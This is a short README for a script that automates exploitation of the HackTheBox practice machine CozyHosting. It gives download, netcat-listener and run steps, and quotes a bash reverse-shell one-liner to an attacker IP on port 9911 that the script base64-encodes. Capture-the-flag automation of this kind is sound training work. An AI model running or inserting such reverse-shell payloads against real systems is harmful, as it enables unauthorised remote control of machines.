# machine_automations

## [CozyHosting](https://app.hackthebox.com/machines/CozyHosting) HackTheBox
This is a simple rated machine on HackTheBox. 
To use the script;
1. Download the script using:
 ```bash
 wget https://raw.githubusercontent.com/goretti16kate/machine_automations/master/cozyhosting.py
 ```
 2. Open your netcat(nc) listener:
 ```bash
 nc -nlvp 9911
 ```
 3. Modify the script to contain your ip address on line 55:
 ```python
encoded=os.system("echo 'bash -i >& /dev/tcp/10.10.14.55/9911 0>&1'| base64 -w 0 > encoded.txt") # CHANGE IP HERE

 ```
 4. Run the script
 ```bash
 python3 cozyhosting.py
 ```

To better understand the process, [visit my walkthrough on medium](https://k4713.medium.com/k4713-on-cozyhosting-hackthebox-walkthrough-ed7f949c4ac7)


### Happy Hacking :-)

 ---